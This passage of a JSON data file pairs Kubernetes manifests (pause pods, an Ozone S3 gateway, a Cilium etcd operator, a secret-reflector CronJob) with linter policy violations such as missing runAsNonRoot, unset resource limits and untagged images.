    "violation_text": "The container \"container1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7850",
    "manifest_path": "data/manifests/the_stack_sample/sample_2893.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes15\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - azureDisk:\n      diskName: test\n      diskURI: https://test.blob.core.windows.net/test/test.vhd\n    name: volume1\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"initcontainer1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7851",
    "manifest_path": "data/manifests/the_stack_sample/sample_2893.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes15\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - azureDisk:\n      diskName: test\n      diskURI: https://test.blob.core.windows.net/test/test.vhd\n    name: volume1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"container1\" does not have a read-only root file system"
  },
  {
    "id": "7852",
    "manifest_path": "data/manifests/the_stack_sample/sample_2893.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes15\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - azureDisk:\n      diskName: test\n      diskURI: https://test.blob.core.windows.net/test/test.vhd\n    name: volume1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"initcontainer1\" does not have a read-only root file system"
  },
  {
    "id": "7853",
    "manifest_path": "data/manifests/the_stack_sample/sample_2893.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes15\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - azureDisk:\n      diskName: test\n      diskURI: https://test.blob.core.windows.net/test/test.vhd\n    name: volume1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"container1\" has cpu request 0"
  },
  {
    "id": "7854",
    "manifest_path": "data/manifests/the_stack_sample/sample_2893.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes15\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - azureDisk:\n      diskName: test\n      diskURI: https://test.blob.core.windows.net/test/test.vhd\n    name: volume1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"initcontainer1\" has cpu request 0"
  },
  {
    "id": "7855",
    "manifest_path": "data/manifests/the_stack_sample/sample_2893.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes15\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - azureDisk:\n      diskName: test\n      diskURI: https://test.blob.core.windows.net/test/test.vhd\n    name: volume1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"container1\" has memory limit 0"
  },
  {
    "id": "7856",
    "manifest_path": "data/manifests/the_stack_sample/sample_2893.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes15\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - azureDisk:\n      diskName: test\n      diskURI: https://test.blob.core.windows.net/test/test.vhd\n    name: volume1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"initcontainer1\" has memory limit 0"
  },
  {
    "id": "7857",
    "manifest_path": "data/manifests/the_stack_sample/sample_2894.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: ozone-s3g\n  labels:\n    app: ozone\n    component: s3g\nspec:\n  selector:\n    matchLabels:\n      app: ozone\n      component: s3g\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: ozone\n        component: s3g\n    spec:\n      containers:\n      - name: s3g\n        image: elek/ozone-dev:be8a2fcc8\n        args:\n        - ozone\n        - s3g\n        volumeMounts:\n        - name: data\n          mountPath: /data\n        - name: ozone-dev\n          mountPath: /opt/ozone\n        envFrom:\n        - configMapRef:\n            name: ozone-config\n      volumes:\n      - name: data\n        emptyDir: {}\n      - name: ozone-dev\n        hostPath:\n          path: /home/elek/projects/ozone/hadoop-ozone/dist/target/ozone-0.6.0-SNAPSHOT/\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"s3g\" does not have a read-only root file system"
  },
  {
    "id": "7858",
    "manifest_path": "data/manifests/the_stack_sample/sample_2894.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: ozone-s3g\n  labels:\n    app: ozone\n    component: s3g\nspec:\n  selector:\n    matchLabels:\n      app: ozone\n      component: s3g\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: ozone\n        component: s3g\n    spec:\n      containers:\n      - name: s3g\n        image: elek/ozone-dev:be8a2fcc8\n        args:\n        - ozone\n        - s3g\n        volumeMounts:\n        - name: data\n          mountPath: /data\n        - name: ozone-dev\n          mountPath: /opt/ozone\n        envFrom:\n        - configMapRef:\n            name: ozone-config\n      volumes:\n      - name: data\n        emptyDir: {}\n      - name: ozone-dev\n        hostPath:\n          path: /home/elek/projects/ozone/hadoop-ozone/dist/target/ozone-0.6.0-SNAPSHOT/\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"s3g\" is not set to runAsNonRoot"
  },
  {
    "id": "7859",
    "manifest_path": "data/manifests/the_stack_sample/sample_2894.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: ozone-s3g\n  labels:\n    app: ozone\n    component: s3g\nspec:\n  selector:\n    matchLabels:\n      app: ozone\n      component: s3g\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: ozone\n        component: s3g\n    spec:\n      containers:\n      - name: s3g\n        image: elek/ozone-dev:be8a2fcc8\n        args:\n        - ozone\n        - s3g\n        volumeMounts:\n        - name: data\n          mountPath: /data\n        - name: ozone-dev\n          mountPath: /opt/ozone\n        envFrom:\n        - configMapRef:\n            name: ozone-config\n      volumes:\n      - name: data\n        emptyDir: {}\n      - name: ozone-dev\n        hostPath:\n          path: /home/elek/projects/ozone/hadoop-ozone/dist/target/ozone-0.6.0-SNAPSHOT/\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"s3g\" has cpu request 0"
  },
  {
    "id": "7860",
    "manifest_path": "data/manifests/the_stack_sample/sample_2894.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: ozone-s3g\n  labels:\n    app: ozone\n    component: s3g\nspec:\n  selector:\n    matchLabels:\n      app: ozone\n      component: s3g\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: ozone\n        component: s3g\n    spec:\n      containers:\n      - name: s3g\n        image: elek/ozone-dev:be8a2fcc8\n        args:\n        - ozone\n        - s3g\n        volumeMounts:\n        - name: data\n          mountPath: /data\n        - name: ozone-dev\n          mountPath: /opt/ozone\n        envFrom:\n        - configMapRef:\n            name: ozone-config\n      volumes:\n      - name: data\n        emptyDir: {}\n      - name: ozone-dev\n        hostPath:\n          path: /home/elek/projects/ozone/hadoop-ozone/dist/target/ozone-0.6.0-SNAPSHOT/\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"s3g\" has memory limit 0"
  },
  {
    "id": "7861",
    "manifest_path": "data/manifests/the_stack_sample/sample_2895.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    io.cilium/app: etcd-operator\n    name: cilium-etcd-operator\n  name: cilium-etcd-operator\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      io.cilium/app: etcd-operator\n      name: cilium-etcd-operator\n  template:\n    metadata:\n      labels:\n        io.cilium/app: etcd-operator\n        name: cilium-etcd-operator\n    spec:\n      containers:\n      - command:\n        - /usr/bin/cilium-etcd-operator\n        env:\n        - name: CILIUM_ETCD_OPERATOR_CLUSTER_DOMAIN\n          value: cluster.local\n        - name: CILIUM_ETCD_OPERATOR_ETCD_CLUSTER_SIZE\n          value: '3'\n        - name: CILIUM_ETCD_OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n        - name: CILIUM_ETCD_OPERATOR_POD_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.name\n        - name: CILIUM_ETCD_OPERATOR_POD_UID\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.uid\n        image: docker.io/cilium/cilium-etcd-operator:v2.0.5\n        imagePullPolicy: IfNotPresent\n        name: cilium-etcd-operator\n      serviceAccount: cilium-etcd-operator\n      serviceAccountName: cilium-etcd-operator\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "7862",
    "manifest_path": "data/manifests/the_stack_sample/sample_2895.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    io.cilium/app: etcd-operator\n    name: cilium-etcd-operator\n  name: cilium-etcd-operator\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      io.cilium/app: etcd-operator\n      name: cilium-etcd-operator\n  template:\n    metadata:\n      labels:\n        io.cilium/app: etcd-operator\n        name: cilium-etcd-operator\n    spec:\n      containers:\n      - command:\n        - /usr/bin/cilium-etcd-operator\n        env:\n        - name: CILIUM_ETCD_OPERATOR_CLUSTER_DOMAIN\n          value: cluster.local\n        - name: CILIUM_ETCD_OPERATOR_ETCD_CLUSTER_SIZE\n          value: '3'\n        - name: CILIUM_ETCD_OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n        - name: CILIUM_ETCD_OPERATOR_POD_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.name\n        - name: CILIUM_ETCD_OPERATOR_POD_UID\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.uid\n        image: docker.io/cilium/cilium-etcd-operator:v2.0.5\n        imagePullPolicy: IfNotPresent\n        name: cilium-etcd-operator\n      serviceAccount: cilium-etcd-operator\n      serviceAccountName: cilium-etcd-operator\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cilium-etcd-operator\" does not have a read-only root file system"
  },
  {
    "id": "7863",
    "manifest_path": "data/manifests/the_stack_sample/sample_2895.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    io.cilium/app: etcd-operator\n    name: cilium-etcd-operator\n  name: cilium-etcd-operator\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      io.cilium/app: etcd-operator\n      name: cilium-etcd-operator\n  template:\n    metadata:\n      labels:\n        io.cilium/app: etcd-operator\n        name: cilium-etcd-operator\n    spec:\n      containers:\n      - command:\n        - /usr/bin/cilium-etcd-operator\n        env:\n        - name: CILIUM_ETCD_OPERATOR_CLUSTER_DOMAIN\n          value: cluster.local\n        - name: CILIUM_ETCD_OPERATOR_ETCD_CLUSTER_SIZE\n          value: '3'\n        - name: CILIUM_ETCD_OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n        - name: CILIUM_ETCD_OPERATOR_POD_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.name\n        - name: CILIUM_ETCD_OPERATOR_POD_UID\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.uid\n        image: docker.io/cilium/cilium-etcd-operator:v2.0.5\n        imagePullPolicy: IfNotPresent\n        name: cilium-etcd-operator\n      serviceAccount: cilium-etcd-operator\n      serviceAccountName: cilium-etcd-operator\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"cilium-etcd-operator\" not found"
  },
  {
    "id": "7864",
    "manifest_path": "data/manifests/the_stack_sample/sample_2895.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    io.cilium/app: etcd-operator\n    name: cilium-etcd-operator\n  name: cilium-etcd-operator\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      io.cilium/app: etcd-operator\n      name: cilium-etcd-operator\n  template:\n    metadata:\n      labels:\n        io.cilium/app: etcd-operator\n        name: cilium-etcd-operator\n    spec:\n      containers:\n      - command:\n        - /usr/bin/cilium-etcd-operator\n        env:\n        - name: CILIUM_ETCD_OPERATOR_CLUSTER_DOMAIN\n          value: cluster.local\n        - name: CILIUM_ETCD_OPERATOR_ETCD_CLUSTER_SIZE\n          value: '3'\n        - name: CILIUM_ETCD_OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n        - name: CILIUM_ETCD_OPERATOR_POD_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.name\n        - name: CILIUM_ETCD_OPERATOR_POD_UID\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.uid\n        image: docker.io/cilium/cilium-etcd-operator:v2.0.5\n        imagePullPolicy: IfNotPresent\n        name: cilium-etcd-operator\n      serviceAccount: cilium-etcd-operator\n      serviceAccountName: cilium-etcd-operator\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cilium-etcd-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "7865",
    "manifest_path": "data/manifests/the_stack_sample/sample_2895.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    io.cilium/app: etcd-operator\n    name: cilium-etcd-operator\n  name: cilium-etcd-operator\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      io.cilium/app: etcd-operator\n      name: cilium-etcd-operator\n  template:\n    metadata:\n      labels:\n        io.cilium/app: etcd-operator\n        name: cilium-etcd-operator\n    spec:\n      containers:\n      - command:\n        - /usr/bin/cilium-etcd-operator\n        env:\n        - name: CILIUM_ETCD_OPERATOR_CLUSTER_DOMAIN\n          value: cluster.local\n        - name: CILIUM_ETCD_OPERATOR_ETCD_CLUSTER_SIZE\n          value: '3'\n        - name: CILIUM_ETCD_OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n        - name: CILIUM_ETCD_OPERATOR_POD_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.name\n        - name: CILIUM_ETCD_OPERATOR_POD_UID\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.uid\n        image: docker.io/cilium/cilium-etcd-operator:v2.0.5\n        imagePullPolicy: IfNotPresent\n        name: cilium-etcd-operator\n      serviceAccount: cilium-etcd-operator\n      serviceAccountName: cilium-etcd-operator\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cilium-etcd-operator\" has cpu request 0"
  },
  {
    "id": "7866",
    "manifest_path": "data/manifests/the_stack_sample/sample_2895.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    io.cilium/app: etcd-operator\n    name: cilium-etcd-operator\n  name: cilium-etcd-operator\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      io.cilium/app: etcd-operator\n      name: cilium-etcd-operator\n  template:\n    metadata:\n      labels:\n        io.cilium/app: etcd-operator\n        name: cilium-etcd-operator\n    spec:\n      containers:\n      - command:\n        - /usr/bin/cilium-etcd-operator\n        env:\n        - name: CILIUM_ETCD_OPERATOR_CLUSTER_DOMAIN\n          value: cluster.local\n        - name: CILIUM_ETCD_OPERATOR_ETCD_CLUSTER_SIZE\n          value: '3'\n        - name: CILIUM_ETCD_OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n        - name: CILIUM_ETCD_OPERATOR_POD_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.name\n        - name: CILIUM_ETCD_OPERATOR_POD_UID\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.uid\n        image: docker.io/cilium/cilium-etcd-operator:v2.0.5\n        imagePullPolicy: IfNotPresent\n        name: cilium-etcd-operator\n      serviceAccount: cilium-etcd-operator\n      serviceAccountName: cilium-etcd-operator\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cilium-etcd-operator\" has memory limit 0"
  },
  {
    "id": "7867",
    "manifest_path": "data/manifests/the_stack_sample/sample_2897.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: secret-reflector\n  namespace: networking\nspec:\n  jobTemplate:\n    template:\n      spec:\n        serviceAccountName: sa-secret-reflector\n        containers:\n        - name: secret-reflector\n          image: ghcr.io/k8s-at-home/kubectl:v1.23.1\n          env:\n          - name: SECRETS\n            value: ${SECRET_DOMAIN/./-}-tls\n          command:\n          - /bin/sh\n          - -ec\n          - \"set -o nounset\\nset -o errexit\\n# space delimited secrets to copy\\nsecrets=\\\"\\\n            ${SECRETS}\\\"\\n# source namespace to reflect secret from\\nnamespace_source=\\\"\\\n            networking\\\"\\n# space delimited namespace where to reflect the secrets\\\n            \\ to\\nnamespace_destination=\\\"home media\\\"\\nfor secret in ${secrets};\\\n            \\ do\\n    secret_source_content=\\\"$(kubectl get secret \\\"${secret}\\\" -n\\\n            \\ \\\"${namespace_source}\\\" -o json | jq 'del(.metadata.managedFields, .metadata.creationTimestamp,\\\n            \\ .metadata.resourceVersion, .metadata.uid)')\\\"\\n    secret_source_checksum=\\\"\\\n            $(echo \\\"${secret_source_content}\\\" | jq 'del(.metadata.namespace)' |\\\n            \\ md5sum | awk '{ print $1 }')\\\"\\n    for namespace in ${namespace_destination};\\\n            \\ do\\n        if kubectl get secret \\\"${secret}\\\" -n \\\"${namespace}\\\"\\\n            \\ >/dev/null 2>&1; then\\n            secret_dest_content=\\\"$(kubectl get\\\n            \\ secret \\\"${secret}\\\" -n \\\"${namespace}\\\" -o json | jq 'del(.metadata.managedFields,\\\n            \\ .metadata.creationTimestamp, .metadata.resourceVersion, .metadata.uid)')\\\"\\\n            \\n            secret_dest_checksum=\\\"$(echo \\\"${secret_dest_content}\\\"\\\n            \\ | jq 'del(.metadata.namespace)' | md5sum | awk '{ print $1 }')\\\"\\n \\\n            \\           if [ \\\"${secret_source_checksum}\\\" != \\\"${secret_dest_checksum}\\\"\\\n            \\ ]; then\\n                echo \\\"${secret_source_content}\\\" | \\\\\\n  \\\n            \\                  jq -r --arg namespace \\\"$namespace\\\" '.metadata.namespace\\\n            \\ = $namespace' | \\\\\\n                    kubectl replace -n \\\"${namespace}\\\"\\\n            \\ -f -\\n            fi\\n        else\\n            echo \\\"${secret_source_content}\\\"\\\n            \\ | \\\\\\n                jq -r --arg namespace \\\"$namespace\\\" '.metadata.namespace\\\n            \\ = $namespace' | \\\\\\n                kubectl apply -n \\\"${namespace}\\\"\\\n            \\ -f -\\n        fi\\n    done\\ndone\\n\"\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable SECRETS in container \"secret-reflector\" found"
  },
  {
    "id": "7868",
    "manifest_path": "data/manifests/the_stack_sample/sample_2897.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: secret-reflector\n  namespace: networking\nspec:\n  jobTemplate:\n    template:\n      spec:\n        serviceAccountName: sa-secret-reflector\n        containers:\n        - name: secret-reflector\n          image: ghcr.io/k8s-at-home/kubectl:v1.23.1\n          env:\n          - name: SECRETS\n            value: ${SECRET_DOMAIN/./-}-tls\n          command:\n          - /bin/sh\n          - -ec\n          - \"set -o nounset\\nset -o errexit\\n# space delimited secrets to copy\\nsecrets=\\\"\\\n            ${SECRETS}\\\"\\n# source namespace to reflect secret from\\nnamespace_source=\\\"\\\n            networking\\\"\\n# space delimited namespace where to reflect the secrets\\\n            \\ to\\nnamespace_destination=\\\"home media\\\"\\nfor secret in ${secrets};\\\n            \\ do\\n    secret_source_content=\\\"$(kubectl get secret \\\"${secret}\\\" -n\\\n            \\ \\\"${namespace_source}\\\" -o json | jq 'del(.metadata.managedFields, .metadata.creationTimestamp,\\\n            \\ .metadata.resourceVersion, .metadata.uid)')\\\"\\n    secret_source_checksum=\\\"\\\n            $(echo \\\"${secret_source_content}\\\" | jq 'del(.metadata.namespace)' |\\\n            \\ md5sum | awk '{ print $1 }')\\\"\\n    for namespace in ${namespace_destination};\\\n            \\ do\\n        if kubectl get secret \\\"${secret}\\\" -n \\\"${namespace}\\\"\\\n            \\ >/dev/null 2>&1; then\\n            secret_dest_content=\\\"$(kubectl get\\\n            \\ secret \\\"${secret}\\\" -n \\\"${namespace}\\\" -o json | jq 'del(.metadata.managedFields,\\\n            \\ .metadata.creationTimestamp, .metadata.resourceVersion, .metadata.uid)')\\\"\\\n            \\n            secret_dest_checksum=\\\"$(echo \\\"${secret_dest_content}\\\"\\\n            \\ | jq 'del(.metadata.namespace)' | md5sum | awk '{ print $1 }')\\\"\\n \\\n            \\           if [ \\\"${secret_source_checksum}\\\" != \\\"${secret_dest_checksum}\\\"\\\n            \\ ]; then\\n                echo \\\"${secret_source_content}\\\" | \\\\\\n  \\\n            \\                  jq -r --arg namespace \\\"$namespace\\\" '.metadata.namespace\\\n            \\ = $namespace' | \\\\\\n                    kubectl replace -n \\\"${namespace}\\\"\\\n            \\ -f -\\n            fi\\n        else\\n            echo \\\"${secret_source_content}\\\"\\\n            \\ | \\\\\\n                jq -r --arg namespace \\\"$namespace\\\" '.metadata.namespace\\\n            \\ = $namespace' | \\\\\\n                kubectl apply -n \\\"${namespace}\\\"\\\n            \\ -f -\\n        fi\\n    done\\ndone\\n\"\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"secret-reflector\" does not have a read-only root file system"
  },
  {
    "id": "7869",
    "manifest_path": "data/manifests/the_stack_sample/sample_2897.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: secret-reflector\n  namespace: networking\nspec:\n  jobTemplate:\n    template:\n      spec:\n        serviceAccountName: sa-secret-reflector\n        containers:\n        - name: secret-reflector\n          image: ghcr.io/k8s-at-home/kubectl:v1.23.1\n          env:\n          - name: SECRETS\n            value: ${SECRET_DOMAIN/./-}-tls\n          command:\n          - /bin/sh\n          - -ec\n          - \"set -o nounset\\nset -o errexit\\n# space delimited secrets to copy\\nsecrets=\\\"\\\n            ${SECRETS}\\\"\\n# source namespace to reflect secret from\\nnamespace_source=\\\"\\\n            networking\\\"\\n# space delimited namespace where to reflect the secrets\\\n            \\ to\\nnamespace_destination=\\\"home media\\\"\\nfor secret in ${secrets};\\\n            \\ do\\n    secret_source_content=\\\"$(kubectl get secret \\\"${secret}\\\" -n\\\n            \\ \\\"${namespace_source}\\\" -o json | jq 'del(.metadata.managedFields, .metadata.creationTimestamp,\\\n            \\ .metadata.resourceVersion, .metadata.uid)')\\\"\\n    secret_source_checksum=\\\"\\\n            $(echo \\\"${secret_source_content}\\\" | jq 'del(.metadata.namespace)' |\\\n            \\ md5sum | awk '{ print $1 }')\\\"\\n    for namespace in ${namespace_destination};\\\n            \\ do\\n        if kubectl get secret \\\"${secret}\\\" -n \\\"${namespace}\\\"\\\n            \\ >/dev/null 2>&1; then\\n            secret_dest_content=\\\"$(kubectl get\\\n            \\ secret \\\"${secret}\\\" -n \\\"${namespace}\\\" -o json | jq 'del(.metadata.managedFields,\\\n            \\ .metadata.creationTimestamp, .metadata.resourceVersion, .metadata.uid)')\\\"\\\n            \\n            secret_dest_checksum=\\\"$(echo \\\"${secret_dest_content}\\\"\\\n            \\ | jq 'del(.metadata.namespace)' | md5sum | awk '{ print $1 }')\\\"\\n \\\n            \\           if [ \\\"${secret_source_checksum}\\\" != \\\"${secret_dest_checksum}\\\"\\\n            \\ ]; then\\n                echo \\\"${secret_source_content}\\\" | \\\\\\n  \\\n            \\                  jq -r --arg namespace \\\"$namespace\\\" '.metadata.namespace\\\n            \\ = $namespace' | \\\\\\n                    kubectl replace -n \\\"${namespace}\\\"\\\n            \\ -f -\\n            fi\\n        else\\n            echo \\\"${secret_source_content}\\\"\\\n            \\ | \\\\\\n                jq -r --arg namespace \\\"$namespace\\\" '.metadata.namespace\\\n            \\ = $namespace' | \\\\\\n                kubectl apply -n \\\"${namespace}\\\"\\\n            \\ -f -\\n        fi\\n    done\\ndone\\n\"\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"sa-secret-reflector\" not found"
  },
  {
    "id": "7870",
    "manifest_path": "data/manifests/the_stack_sample/sample_2897.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: secret-reflector\n  namespace: networking\nspec:\n  jobTemplate:\n    template:\n      spec:\n        serviceAccountName: sa-secret-reflector\n        containers:\n        - name: secret-reflector\n          image: ghcr.io/k8s-at-home/kubectl:v1.23.1\n          env:\n          - name: SECRETS\n            value: ${SECRET_DOMAIN/./-}-tls\n          command:\n          - /bin/sh\n          - -ec\n          - \"set -o nounset\\nset -o errexit\\n# space delimited secrets to copy\\nsecrets=\\\"\\\n            ${SECRETS}\\\"\\n# source namespace to reflect secret from\\nnamespace_source=\\\"\\\n            networking\\\"\\n# space delimited namespace where to reflect the secrets\\\n            \\ to\\nnamespace_destination=\\\"home media\\\"\\nfor secret in ${secrets};\\\n            \\ do\\n    secret_source_content=\\\"$(kubectl get secret \\\"${secret}\\\" -n\\\n            \\ \\\"${namespace_source}\\\" -o json | jq 'del(.metadata.managedFields, .metadata.creationTimestamp,\\\n            \\ .metadata.resourceVersion, .metadata.uid)')\\\"\\n    secret_source_checksum=\\\"\\\n            $(echo \\\"${secret_source_content}\\\" | jq 'del(.metadata.namespace)' |\\\n            \\ md5sum | awk '{ print $1 }')\\\"\\n    for namespace in ${namespace_destination};\\\n            \\ do\\n        if kubectl get secret \\\"${secret}\\\" -n \\\"${namespace}\\\"\\\n            \\ >/dev/null 2>&1; then\\n            secret_dest_content=\\\"$(kubectl get\\\n            \\ secret \\\"${secret}\\\" -n \\\"${namespace}\\\" -o json | jq 'del(.metadata.managedFields,\\\n            \\ .metadata.creationTimestamp, .metadata.resourceVersion, .metadata.uid)')\\\"\\\n            \\n            secret_dest_checksum=\\\"$(echo \\\"${secret_dest_content}\\\"\\\n            \\ | jq 'del(.metadata.namespace)' | md5sum | awk '{ print $1 }')\\\"\\n \\\n            \\           if [ \\\"${secret_source_checksum}\\\" != \\\"${secret_dest_checksum}\\\"\\\n            \\ ]; then\\n                echo \\\"${secret_source_content}\\\" | \\\\\\n  \\\n            \\                  jq -r --arg namespace \\\"$namespace\\\" '.metadata.namespace\\\n            \\ = $namespace' | \\\\\\n                    kubectl replace -n \\\"${namespace}\\\"\\\n            \\ -f -\\n            fi\\n        else\\n            echo \\\"${secret_source_content}\\\"\\\n            \\ | \\\\\\n                jq -r --arg namespace \\\"$namespace\\\" '.metadata.namespace\\\n            \\ = $namespace' | \\\\\\n                kubectl apply -n \\\"${namespace}\\\"\\\n            \\ -f -\\n        fi\\n    done\\ndone\\n\"\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"secret-reflector\" is not set to runAsNonRoot"
  },
  {
    "id": "7871",
    "manifest_path": "data/manifests/the_stack_sample/sample_2897.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: secret-reflector\n  namespace: networking\nspec:\n  jobTemplate:\n    template:\n      spec:\n        serviceAccountName: sa-secret-reflector\n        containers:\n        - name: secret-reflector\n          image: ghcr.io/k8s-at-home/kubectl:v1.23.1\n          env:\n          - name: SECRETS\n            value: ${SECRET_DOMAIN/./-}-tls\n          command:\n          - /bin/sh\n          - -ec\n          - \"set -o nounset\\nset -o errexit\\n# space delimited secrets to copy\\nsecrets=\\\"\\\n            ${SECRETS}\\\"\\n# source namespace to reflect secret from\\nnamespace_source=\\\"\\\n            networking\\\"\\n# space delimited namespace where to reflect the secrets\\\n            \\ to\\nnamespace_destination=\\\"home media\\\"\\nfor secret in ${secrets};\\\n            \\ do\\n    secret_source_content=\\\"$(kubectl get secret \\\"${secret}\\\" -n\\\n            \\ \\\"${namespace_source}\\\" -o json | jq 'del(.metadata.managedFields, .metadata.creationTimestamp,\\\n            \\ .metadata.resourceVersion, 